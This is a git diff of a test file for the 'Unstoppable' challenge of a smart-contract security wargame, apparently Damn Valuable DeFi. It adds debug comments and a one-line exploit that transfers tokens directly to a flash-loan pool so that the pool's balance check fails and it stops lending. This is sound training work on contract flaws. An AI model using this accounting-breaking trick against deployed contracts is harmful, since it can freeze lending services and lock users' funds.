@@ -12,7 +12,10 @@ describe('[Challenge] Unstoppable', function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
 
         [deployer, attacker, someUser] = await ethers.getSigners();
-
+        // const asd = await ethers.getSigners();
+        // console.log('asd.length', asd.length);
+        // console.log('attacker', attacker);
+        // console.log('someUser', someUser);
         const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);
 
@@ -35,11 +38,22 @@ describe('[Challenge] Unstoppable', function () {
          // Show it's possible for someUser to take out a flash loan
          const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
          this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
+        //  console.log('receiverContract', this.receiverContract);
          await this.receiverContract.executeFlashLoan(10);
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+           // Sending token directly and not using the pool's deposit function
+        // will break the internal accounting.
+        // this.pool
+        await this.token.connect(attacker).transfer(this.pool.address, 50);
+        // await this.token.transfer(attacker, 1);
+        // await this.token.connect(attacker).transfer(this.pool.address, 1);
+        // await this.receiverContract.executeFlashLoan(10);
+        // await   this.pool.depositTokens(10)
+        // await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+
     });
 
     after(async function () {
